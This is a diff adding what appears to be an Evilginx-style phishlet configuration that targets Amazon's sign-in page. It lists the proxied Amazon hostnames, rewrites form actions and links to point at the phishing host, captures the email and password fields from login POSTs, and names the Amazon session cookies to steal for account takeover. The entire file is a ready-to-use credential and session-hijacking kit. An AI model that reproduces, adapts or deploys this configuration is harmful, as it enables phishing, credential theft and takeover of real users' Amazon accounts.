@@ -1,0 +1,36 @@
+author: '@an0nud4y'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
+  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'action="https://www.amazon.com', replace: 'action="https://www.{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'href="https://www.amazon.com', replace: 'href="https://www.{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'action="https://fls-na.amazon.com', replace: 'action="https://fls-na.{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'href="https://fls-na.amazon.com', replace: 'href="https://fls-na.{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'images-na.ssl-images-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'src="https://images-na.ssl-images-amazon.com', replace: 'src="https://images-na.{hostname}', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['at-main','lc-main','sess-at-main','session-id','session-id-time','session-token','sst-main','ubid-main','x-main','skin','a-ogbcbff']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  path: '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
+    search: ['email', 'password', 'appActionToken', 'workflowState', 'openid.return_to', 'prevRID']
+    
+login:
+  domain: 'www.amazon.com'
+  path: '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
